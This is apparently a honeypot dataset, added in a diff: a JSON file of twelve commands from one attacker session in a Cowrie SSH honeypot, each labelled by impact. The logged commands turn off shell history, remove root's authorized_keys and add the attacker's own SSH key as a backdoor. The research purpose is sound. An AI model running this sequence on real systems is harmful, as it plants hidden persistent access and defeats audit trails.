@@ -1,0 +1,122 @@
+[
+  {
+    "index": 1,
+    "session_id": "6c70d195",
+    "cmd": "uname -a",
+    "cowrie_output": "\u001b[4lLinux svr04 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux",
+    "latency_ms": 8075.56,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 2,
+    "session_id": "6c70d195",
+    "cmd": "unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH",
+    "cowrie_output": "",
+    "latency_ms": 8075.03,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 3,
+    "session_id": "6c70d195",
+    "cmd": "history -n",
+    "cowrie_output": "\u001b[4l    1  uname -a\n2  unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH\n3  history -n",
+    "latency_ms": 8075.32,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 4,
+    "session_id": "6c70d195",
+    "cmd": "export HISTFILE=/dev/null",
+    "cowrie_output": "",
+    "latency_ms": 8074.62,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 5,
+    "session_id": "6c70d195",
+    "cmd": "export HISTSIZE=0",
+    "cowrie_output": "",
+    "latency_ms": 8075.4,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 6,
+    "session_id": "6c70d195",
+    "cmd": "export HISTFILESIZE=0",
+    "cowrie_output": "",
+    "latency_ms": 8074.93,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 7,
+    "session_id": "6c70d195",
+    "cmd": "cd",
+    "cowrie_output": "",
+    "latency_ms": 8074.86,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  },
+  {
+    "index": 8,
+    "session_id": "6c70d195",
+    "cmd": "mkdir /root/.ssh",
+    "cowrie_output": "\u001b[4lmkdir: cannot create directory `/root/.ssh': File exists",
+    "latency_ms": 8074.62,
+    "fi": 1,
+    "fi_label": "Create/Install",
+    "skipped": false
+  },
+  {
+    "index": 9,
+    "session_id": "6c70d195",
+    "cmd": "rm -rf .ssh/authorized_keys",
+    "cowrie_output": "",
+    "latency_ms": 8074.84,
+    "fi": 4,
+    "fi_label": "Impact/Delete/Passwd",
+    "skipped": false
+  },
+  {
+    "index": 10,
+    "session_id": "6c70d195",
+    "cmd": "touch .ssh/authorized_keys",
+    "cowrie_output": "",
+    "latency_ms": 8074.97,
+    "fi": 1,
+    "fi_label": "Create/Install",
+    "skipped": false
+  },
+  {
+    "index": 11,
+    "session_id": "6c70d195",
+    "cmd": "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> /root/.ssh/authorized_keys",
+    "cowrie_output": "",
+    "latency_ms": 8074.96,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 12,
+    "session_id": "6c70d195",
+    "cmd": "cd",
+    "cowrie_output": "",
+    "latency_ms": 8074.06,
+    "fi": 0,
+    "fi_label": "Read/Display",
+    "skipped": false
+  }
+]
